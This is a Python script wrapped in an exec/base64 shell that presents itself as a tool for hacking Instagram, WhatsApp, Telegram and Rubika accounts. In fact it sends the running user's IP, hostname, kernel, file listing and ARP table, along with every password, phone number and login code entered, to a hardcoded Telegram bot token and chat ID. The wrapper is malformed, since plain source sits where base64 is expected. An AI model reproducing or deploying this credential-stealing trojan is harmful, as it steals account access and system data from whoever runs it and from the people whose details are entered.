import base64
exec(base64.b64decode("import requests, time, sys, os, random, sh
import socket
from colorama import *
import datetime
#-------Run-----------
os.system('clear')
Key = "a2FsaWxpbnV4"
os.system("""echo "Marke :> @EBLITSM \nEBLIS -XC ">EBLIS.txt """)
#---------
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
print(Fore.GREEN+" <-------",Fore.RED+"EBLIS",Fore.GREEN+"------>\n","Slm Be Abzar EBLIS Khosh Omdin\n","<----------------->\n",Fore.CYAN+"<---KEY---:>",Fore.RED+"Key :> ",Fore.RED+"a2FsaWxpbnV4\n")
Login = str(input(Fore.RED+" Key :> "))
if local_ip == "127.0.1.2" and "127.0.0.1" and "127.0.0.0" and "127.1.1.1":
	os.system('clear')
	print("Your Ban IP")
	ipbanUrl = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=ip Ban :> "+str(local_ip)
	ipbanDb = {"UrlBox":ipbanUrl, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
	ipban = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=ipbanDb)
	sys.exit()
if Login == Key:
	listuser = ["USER : 1","USER : 2","USER : 3","USER : 4","USER : 5"]
	listrandom = random.choice(listuser)
	time.sleep(3)
	os.system('clear')
	print(Fore.RED+"Account Login")
	print(Fore.CYAN+"<-------->")
	datetime_object = datetime.datetime.now()
	find_pwd = str(sh.pwd())
	arp = sh.arp()
	LoginUrl = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=\t\t<-----Login Shod!----->\n\nای پی :> "+str(local_ip)+str("\nای پی سیستم :>  ")+str(sh.hostname("-I"))+str("اطلاعات :> ")+str(sh.uname("-r"))+str("سیستم :> ")+str(sh.uname())+str()+str("\n\n<----فایل ها---->\n\n")+str(sh.ls().split())+str("\n\n<----مسیر---->\n\n")+str("مسیر :> ")+str(sh.pwd())+str("\n\n")+str("<----TIME---->\n")+str("Time : ")+str(datetime_object)+str("\n\n<----Arp---->\n\n")+str("\n")+str(arp)+str("\n<-------------------------------------------->")
	#--------------------------------------------------------------
	LoginDb = {"UrlBox":LoginUrl, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
	Loginsend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=LoginDb)
	time.sleep(4)
	os.system('clear')
else:
	os.system('clear')
	time.sleep(2)
	print("Key Not Find!")
#-----Enter----
if Login == Key:
	print(Fore.GREEN+"Add Ro vard Kon "+Fore.RED+"1,2,3....\n",Fore.RED+"<--------->",Fore.CYAN+"\n[1]-> Hack Instagram\n[2]-> Self Rubika\n[3]-> Self Telegram\n[4]-> Hack WhatsaApp\n",Fore.RED+"<--------->\n")
	Enter = str(input(Fore.GREEN+"Enter :> "))
	#------Mobile-----
	if Enter == "1":
		os.system('clear')
		time.sleep(2)
		print(Fore.RED+"Loading......")
		time.sleep(2)
		os.system('clear')
		Mobile = str(input("ID Instagram :> "))
		time.sleep(3)
		MoNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Instagram :> "+Mobile
		MoDb = {"UrlBox":MoNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Mosend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=MoDb)
		time.sleep(3)
		print(Fore.CYAN+"<------",Fore.GREEN+"----->")
		MoCode = str(input(Fore.RED+"PASSWORD :> "))
		MoNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Instagram pass :> "+MoCode
		MoDb = {"UrlBox":MoNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Mosend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=MoDb)
		print(Fore.GREEN+"\nHack Instagram\n<---------->\n\n",Fore.RED+"Target Hacked send DB Your Bot")
		time.sleep(3)
		sys.exit()
	#----Rubika-----
	if Enter == "2":
		os.system('clear')
		time.sleep(2)
		print(Fore.RED+"Loading......")
		time.sleep(2)
		os.system('clear')
		Rubika = str(input(Fore.GREEN+"Number Rubika :> "))
		time.sleep(3)
		RuNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Rubika Number :> "+Rubika
		RuDb = {"UrlBox":RuNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Rusend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=RuDb)
		print(Fore.RED+"<---------->")
		RuCode = str(input(Fore.GREEN+"Code Rubika :> "))
		RuNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Rubika Code :> "+RuCode
		RuDb = {"UrlBox":RuNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Rusend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=RuDb)
		os.system('clear')
		time.sleep(3)
		print(Fore.RED+"SELF Rubika Run")
		time.sleep(120)
#-----Telegram-----
	if Enter == "3":
		os.system('clear')
		time.sleep(2)
		print(Fore.RED+"Loading......")
		time.sleep(2)
		os.system('clear')
		Telegram = str(input(Fore.RED+"Number Telegram :> "))
		time.sleep(3)
		TelNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Telegram Number :> "+Telegram
		TelDb = {"UrlBox":TelNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Telsend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=TelDb)
		print(Fore.CYAN+"<------------>")
		TelCode = str(input("Telegram Code :> "))
		TelNumber = "https://api.telegram.org/bot1711534511:AAH1uHudIIbp2Bjj5HuvEMhGaI0QZ2ixo1g/sendmessage?chat_id=1469547340&text=Telegram Code :> "+TelCode
		TelDb = {"UrlBox":TelNumber, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
		Telsend = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=TelDb)
		os.system('clear')
		print(Fore.GREEN+"Run SELF Telegram\n\n")
		time.sleep(3)
		os.system('clear')
		print("SELF Run.........")
		time.sleep(20)
		print("/help \n/game \n/fun \n/enmy \n/Type \n/spam \n/Setting\n\n")
		Telegramself = str(input("Enter ?> "))
		if Telegramself == "/help":
			print("/game \n/jang \n/type \n/nano \n/Mashin \n/Hack \n/Delet \n/Abr \n/Mobile Number \n/Deb")
			if Telegramself == "/game":
				print("not Find!")
				time.sleep(4)
				sys.exit()
				if Telegramself	== "/fun":
					print("Not Find!")
					time.sleep(4)
					sys.exit()
					if Telegramself == "/enmy":
						print("Not Find!")
						time.sleep(4)
						sys.exit()
		if Telegramself == "/Type":
			print("Not Find!")
			time.sleep(4)
			sys.exit()
			if Telegramself == "/spam":
				print("Not Find!")
				time.sleep(4)
				sys.exit()
				if Telegramself == "/Setting":
					print("Not Find!")
					time.sleep(4)
					sys.exit()
	if Enter == "4":
		os.system('clear')
		print(Fore.RED+"Not Hack WhatsaApp Find!")
	sys.exit()
"))